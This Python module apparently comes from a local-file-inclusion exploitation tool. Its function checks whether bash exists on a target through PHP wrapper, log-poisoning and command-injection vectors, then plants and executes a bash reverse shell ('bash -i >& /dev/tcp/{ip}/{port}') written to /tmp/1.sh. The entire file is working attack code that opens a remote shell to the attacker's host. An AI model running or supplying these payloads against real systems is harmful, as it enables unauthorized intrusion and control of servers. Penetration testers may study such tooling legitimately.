"""Bash"""
from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import ArgumentHandler
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo
from src.utils import colors


def exploit_bash(exploit, method, ip, port):
    """Exploit Bash"""
    args = ArgumentHandler()
    url = exploit["GETVAL"]
    post = exploit["POSTVAL"]

    print(
        colors.purple("[?]") + " Checking if bash is available on the target system..."
    )

    if method == "INPUT" and config.tempArg not in url:
        bashTest = "which bash"
        bashPayloadStageOne = (
            f"echo 'bash -i >& /dev/tcp/{ip}/{port}+0>&1'>/tmp/1.sh"
        )
        bashPayloadStageTwo = "bash /tmp/1.sh"

    else:
        bashTest = "which%20bash"
        bashPayloadStageOne = (
            f"echo+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'>/tmp/1.sh"
        )
        bashPayloadStageTwo = "bash+/tmp/1.sh"

    if method == "INPUT":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(bashTest)),
                config.proxies,
                "",
                "",
                exploit=True,
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(bashTest)),
                args.args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
                exploit=True,
            )

        if "/bash" in res.text:
            printInfo(ip, port, "bash", "input wrapper")
            if args.args['postreq']:
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                )
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

    if method == "DATA":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(bashTest)),
                args.args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
                exploit=True,
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(bashTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
                exploit=True,
            )
        if "/bash" in res.text:
            printInfo(ip, port, "bash", "data wrapper")
            if args.args['postreq']:
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

    if method == "EXPECT":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(bashTest)),
                config.proxies,
                "",
                "",
                exploit=True,
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(bashTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
                exploit=True,
            )
        if "/bash" in res.text:
            printInfo(ip, port, "bash", "expect wrapper")
            if args.args['postreq']:
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

    if method == "TRUNC":
        exploit_log_poison(
            ip,
            port,
            url,
            encode(bashPayloadStageOne),
            encode(bashPayloadStageTwo),
            bashTest,
            "/bash",
            exploit["POSTVAL"],
        )

    if method == "CMD":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(bashTest)),
                config.proxies,
                "",
                "",
                exploit=True,
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(bashTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
                exploit=True,
            )
        if "/bin" in res.text and "/bash" in res.text:
            printInfo(ip, port, "bash", "command injection")
            if args.args['postreq']:
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
